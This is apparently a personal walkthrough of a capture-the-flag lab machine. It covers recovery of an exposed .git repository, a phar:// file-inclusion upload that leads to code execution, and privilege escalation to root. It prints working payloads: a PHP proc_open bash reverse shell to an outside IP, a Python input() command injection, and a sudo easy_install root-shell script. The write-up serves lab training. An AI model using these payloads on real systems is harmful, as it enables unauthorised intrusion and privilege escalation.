# Take Away
- When seeing a subdirectory related to `development` always check if there is a `.git` directory publicly accessible.
	- Use `git checkout .` at `.git`'s parent directory to recover all artifacts since last commit.
	- Use `git log -p` at `.git`'s parent directory to view all commit history along with changes made.
- `RCE`:
	- `LFI2RCE via phpinfo()` 
	- `LFI2RCE via php filters`
		- `filter chains`
		- `data:\\`
		- `File Upload` + (`phar:\\` or `zip:\\`)
# Metadata
- There is a `.git` repo from the URL `http://10.10.11.177/dev/.git`. After downloading the `git` repo and running `git checkout .` and `git log -p`, one can identify a virtual host `dev.siteisup.htb` which can only be accessed by including the header `Special-Dev: only4dev` within the request.![[Pasted image 20240227150136.png]]
- Upon reviewing the extracted source code, we can see there is an `LFI` at `dev.siteisup.htb` and the `checker.php`  included by default allows us to upload files.
	- ![[Pasted image 20240227205742.png]]
	- ![[Pasted image 20240227205904.png]]
	- One thing to notice that is lots of common extensions are black-listed. However, we can still leverage `PHP Archive` and `phar://` php wrapper.
# Exploitation
- Set up a php payload which contains `<?php phpinfo();?>` and archive it with `zip -r code.phar code.php`. After uploading `code.phar`, navigate to `http://dev.siteisup.htb/?page=phar://uploads/4bfa715ed07a2674b3173da43cab6a64/code.phar/code` to trigger the `RCE`.![[Pasted image 20240227212624.png]]
	- `4bfa715ed07a2674b3173da43cab6a64` is a temporary folder that is created for each upload.
	- `code` is used instead of `code.php` is because `index.php` always appends `.php`.
	- From the `phpinfo()`'s output, one can see that lots of dangerous functions are disable, the only one left is `proc_open` which can be identified by `dfunc-bypasser`.![[Pasted image 20240227213602.png]]
		- https://github.com/teambi0s/dfunc-bypasser
- Set up a php payload containing the following code:
	```php
	<?php  
	$descriptorspec = array(  
	0 => array("pipe", "r"),
	1 => array("pipe", "w"),
	2 => array("file", "/tmp/error-output.txt", "a")
	);  
	$command = "bash -c '/bin/bash -i >& /dev/tcp/10.10.14.23/443 0>&1'";
	$process = proc_open(command, $descriptorspec, $pipes);  
	?>
	```
	- Follow the same step to archive, upload, and trigger `RCE` to receive a reverse shell as `www-data`.
# PrivEsc
- `linpeas` will identify a executable called `siteisup` at `/home/developer/dev/` with `suid` that we can run.![[Pasted image 20240227215840.png]]
	- Under the same directory, there is a python script with similar name called `siteisup_test.py`. Upon reviewing the code, one can identify it is written in `python2` and using `input()` which is vulnerable to command injection.
		- https://medium.com/@abdelazimmohmmed/python-input-vulnerability-30b0bfea22c9
- Running `strings siteisup` will identify it actually calls the python script above, hence when prompted, we can enter `__import__("os").system("bash -i")` to get a shell as user `developer`.
- A quick enumeration with `sudo -l` can identify `developer` can run `/usr/local/bin/easy_install` at `root` without any password.![[Pasted image 20240227221026.png]]
	- Run following code to abusing `sudo` privilege to get a shell as `root`.
		```bash
		TF=$(mktemp -d)
		echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
		sudo easy_install $TF
		```